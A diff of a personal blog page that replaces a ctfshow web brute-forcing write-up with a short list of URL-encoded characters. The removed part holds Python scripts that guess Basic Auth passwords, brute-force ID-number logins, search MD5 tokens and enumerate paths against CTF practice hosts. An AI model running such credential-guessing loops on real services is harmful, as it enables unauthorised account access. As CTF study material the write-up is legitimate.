@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-web入门-爆破, 博客,ctf,web">
+    <meta name="keywords" content="web注意事项, 博客,ctf,web">
     <meta name="description" content="不会ACM，不会CTF，惨惨">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-web入门-爆破 | Rolemee的小破站</title>
+    <title>web注意事项 | Rolemee的小破站</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -329,7 +329,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-web入门-爆破</h1>
+                    <h1 class="description center-align post-title">web注意事项</h1>
                 </div>
             </div>
         </div>
@@ -449,8 +449,12 @@
                                 <span class="chip bg-color">WEB</span>
                             </a>
                         
-                            <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
-                                <span class="chip bg-color">WEB入门</span>
+                            <a href="/tags/WEB%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
+                                <span class="chip bg-color">WEB注意事项</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">学习笔记</span>
                             </a>
                         
                     </div>
@@ -461,8 +465,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ctfshow/" class="post-category">
-                                ctfshow
+                            <a href="/categories/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                web学习笔记
                             </a>
                         
                     </div>
@@ -480,28 +484,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-13
+                    2021-07-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-14
+                    2021-07-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    804
+                    138
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -519,188 +523,25 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>抓包后发现密码base64加密，然后写py脚本跑</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-<span class="token keyword">import</span> random<span class="token punctuation">,</span>requests
-<span class="token keyword">import</span> time
-
-<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
-url <span class="token operator">=</span> <span class="token string">'http://8ae34bab-0586-4bd7-8f4a-3fcef2e95cc8.challenge.ctf.show:8080/'</span>
-<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a<span class="token punctuation">:</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
-        <span class="token comment"># print(i,end="")</span>
-        i <span class="token operator">=</span> i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
-        x <span class="token operator">=</span> i
-        i <span class="token operator">=</span> <span class="token string">"admin:"</span> <span class="token operator">+</span> i
-        i <span class="token operator">=</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-        j <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
-        header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-            <span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string">'Basic %s'</span><span class="token operator">%</span>j
-        <span class="token punctuation">&#125;</span>
-        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> header<span class="token punctuation">)</span>
-        <span class="token comment"># print(requests.get(url,headers = header).text)</span>
-        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"需要用户名和密码才能继续访问"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"密码已找到:"</span><span class="token operator">+</span>x<span class="token punctuation">)</span>
-            <span class="token comment"># print(requests.get(url,headers = header).text)</span>
-            <span class="token keyword">break</span>
-
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密码错误:"</span><span class="token operator">+</span>x<span class="token punctuation">)</span>
-        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
-j <span class="token operator">=</span> <span class="token string">"admin:shark13"</span>
-j <span class="token operator">=</span> j<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-j <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
-j <span class="token operator">=</span> j<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
-header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-    <span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string">'Basic %s'</span> <span class="token operator">%</span> j
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>暂无</p>
-<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>拿到源码后分析</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-03 11:43:51
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-03 11:56:11
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以看到是先把token变成md5加密后的然后比较第2位，第15位，第18位，然后观察到第一位取整在分母，所以只要取第32取整为3并且第2位不为0的字符就可以，写个py跑一下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-<span class="token keyword">import</span> hashlib
-<span class="token keyword">import</span> random<span class="token punctuation">,</span>requests
-<span class="token keyword">import</span> time
-<span class="token keyword">def</span> <span class="token function">toint</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">57</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">48</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">48</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token number">0</span>
-<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        i <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-        j <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>
-        i <span class="token operator">=</span> i<span class="token operator">+</span>j
-        flag <span class="token operator">=</span> i
-        i <span class="token operator">=</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-        a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        a<span class="token punctuation">.</span>update<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-        m <span class="token operator">=</span> a<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> m<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token keyword">and</span> m<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> m<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-            <span class="token keyword">if</span> toint<span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">3</span> <span class="token keyword">and</span> toint<span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>拿到随机种子，自己去试试，得到第一个随机数，传参数进去即可</p>
-<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-03 13:56:57
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-03 15:47:33
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>分析函数，先输入?r=0得到第一个随机数,然后放入php_mt_seed中爆破，得到前三个种子带进去得到</p>
-<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>Chrome抓包以后传空参数、</p>
-<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>打开录取名单以后构造身份证</p>
-<p>抓包然后构造函数，爆破</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
-<span class="token keyword">import</span> time
-
-<span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://0b797204-18d0-4296-90e3-f36aa2191111.challenge.ctf.show:8080/info/checkdb.php'</span>
-<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'621022%04d%02d%02d5237'</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1990</span><span class="token punctuation">,</span><span class="token number">1991</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token comment"># print(str%(i,j,k))</span>
-            temp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>
-            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-                <span class="token string">"a"</span><span class="token punctuation">:</span><span class="token string">"高先伊"</span><span class="token punctuation">,</span>
-                <span class="token string">"p"</span><span class="token punctuation">:</span>temp<span class="token punctuation">,</span>
-            <span class="token punctuation">&#125;</span>
-            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
-                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span>temp<span class="token punctuation">)</span>
-            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>拿到以后查看url发现可以爆破，写脚本爆破</p>
-<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import random
-import time
-
-import requests
-url &#x3D; &#39;http:&#x2F;&#x2F;b6a7edd3-c1f1-4a06-b898-a1187dd11bad.challenge.ctf.show:8080&#x2F;%s&#x2F;%s&#x2F;index.php&#39;
-for i in range(101):
-    for j in range(101):
-        temp&#x3D; url%(i,j)
-        res &#x3D; requests.get(temp)
-        if res.status_code &#x3D;&#x3D; 200:
-            print(res.text)
-            exit()
-        else:
-            print(&quot;error&quot;,temp)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+                <h1 id="web注意事项"><a href="#web注意事项" class="headerlink" title="web注意事项"></a>web注意事项</h1><h2 id="以下字符需要编码以后才能get或者post-转自https-blog-csdn-net-u014231523-article-details-48519499"><a href="#以下字符需要编码以后才能get或者post-转自https-blog-csdn-net-u014231523-article-details-48519499" class="headerlink" title="以下字符需要编码以后才能get或者post(转自https://blog.csdn.net/u014231523/article/details/48519499)"></a>以下字符需要编码以后才能get或者post(转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014231523/article/details/48519499">https://blog.csdn.net/u014231523/article/details/48519499</a>)</h2><ul>
+<li>“+” url中+号的表示空格 转化 %2B</li>
+</ul>
+<ul>
+<li><p>“/” 用来分割目录和子目录 转化 %2F</p>
+</li>
+<li><p>“?” 用来分割请求的url和参数 转化 %3F</p>
+</li>
+<li><p>“%” 用来指定特殊字符 转化 %25</p>
+</li>
+<li><p>“#” 用来表示书签 转化 %23</p>
+</li>
+<li><p>“&amp;” 用来表示url中指定的参数间的分割符 转化%26</p>
+</li>
+<li><p>“=” 用来表示url中指定的参数的值 转化 %3D</p>
+</li>
+<li><p>“” url中的空格可以用+号或编码 转化%20</p>
+</li>
+</ul>
 
                 
             </div>
@@ -727,7 +568,7 @@ for i in range(101):
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://rolemee.com/2021/07/13/ctfshow-web-ru-men-bao-po/">https://rolemee.com/2021/07/13/ctfshow-web-ru-men-bao-po/</a>
+                    <a href="https://rolemee.com/2021/07/16/web-zhu-yi-shi-xiang/">https://rolemee.com/2021/07/16/web-zhu-yi-shi-xiang/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -769,8 +610,12 @@ for i in range(101):
                                     <span class="chip bg-color">WEB</span>
                                 </a>
                             
-                                <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
-                                    <span class="chip bg-color">WEB入门</span>
+                                <a href="/tags/WEB%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
+                                    <span class="chip bg-color">WEB注意事项</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
                         </div>
@@ -942,41 +787,43 @@ for i in range(101):
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/13/ctfshow-web-ru-men-ming-ling-zhi-xing-29-40/">
+                <a href="/2021/07/16/web-zhu-yi-shi-xiang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行 29-40">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="web注意事项">
                         
-                        <span class="card-title">ctfshow-web入门-命令执行 29-40</span>
+                        <span class="card-title">web注意事项</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow web入门
+                            学习笔记
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctfshow/" class="post-category">
-                                    ctfshow
+                            <a href="/categories/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    web学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -984,8 +831,12 @@ for i in range(101):
                         <span class="chip bg-color">WEB</span>
                     </a>
                     
-                    <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
-                        <span class="chip bg-color">WEB入门</span>
+                    <a href="/tags/WEB%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
+                        <span class="chip bg-color">WEB注意事项</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
                 </div>
@@ -999,13 +850,13 @@ for i in range(101):
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/13/ctfshow-web-ru-men-xin-xi-sou-ji/">
+                <a href="/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-58-71/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshow web入门 信息搜集">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-58-71">
                         
-                        <span class="card-title">ctfshow web入门 信息搜集</span>
+                        <span class="card-title">ctfshow-web入门-命令执行-58-71</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1016,7 +867,7 @@ for i in range(101):
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-16
                             </span>
                         <span class="publish-author">
                             
